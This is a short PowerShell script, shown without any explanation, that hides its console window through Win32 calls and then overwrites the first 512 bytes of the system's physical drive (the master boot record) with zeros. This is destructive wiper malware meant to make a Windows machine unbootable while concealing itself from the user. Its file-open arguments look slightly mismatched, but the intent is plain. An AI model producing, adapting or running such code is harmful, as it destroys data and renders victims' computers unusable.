$signature = @"
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
"@
Add-Type -MemberDefinition $signature -Namespace ConsoleUtils -Name WinAPI

$MBR_SIZE = 512
$GENERIC_ALL = 0x10000000
$FILE_SHARE_READ = 0x00000001
$FILE_SHARE_WRITE = 0x00000002
$OPEN_EXISTING = 3

$hide = [ConsoleUtils.WinAPI]::GetConsoleWindow()
[ConsoleUtils.WinAPI]::ShowWindow($hide, 0)

$mbrData = New-Object byte[] $MBR_SIZE
$MasterBootRecord = [System.IO.File]::Open("\\.\PhysicalDrive0", "Open", "Read", "Write")

try {
    $MasterBootRecord.Write($mbrData, 0, $MBR_SIZE)
    Start-Sleep -Seconds 5
    exit
}
catch {
    # Handle exception if needed
}
finally {
    $MasterBootRecord.Close()
}
